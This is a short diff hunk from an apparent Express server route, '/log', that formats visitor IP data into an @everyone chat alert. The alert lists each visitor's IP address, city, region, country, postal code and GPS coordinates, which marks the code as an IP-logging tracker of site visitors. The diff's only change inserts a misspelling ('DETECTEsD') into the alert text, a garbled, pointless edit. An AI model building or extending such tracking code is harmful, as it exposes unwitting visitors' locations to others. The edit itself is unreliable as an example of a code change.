@@ -14,7 +14,7 @@ app.post('/log', async (req, res) => {
         const { ipData } = req.body;
         
         const message = {
-            content: `@everyone 🚨 **NEW VISITOR DETECTED** 🚨\n\n` +
+            content: `@everyone 🚨 **NEW VISITOR DETECTEsD** 🚨\n\n` +
                     `🌐 IP: ${ipData.ip || 'Unknown'}\n` +
                     `📍 Location: ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}, ${ipData.postal || 'Unknown'}, ${ipData.country_calling_code || 'Unknown'}, ${ipData.currency || 'Unknown'}\n` +
                     `🌍 Coords: ${ipData.latitude || 'Unknown'}, ${ipData.longitude || 'Unknown'}\n` +
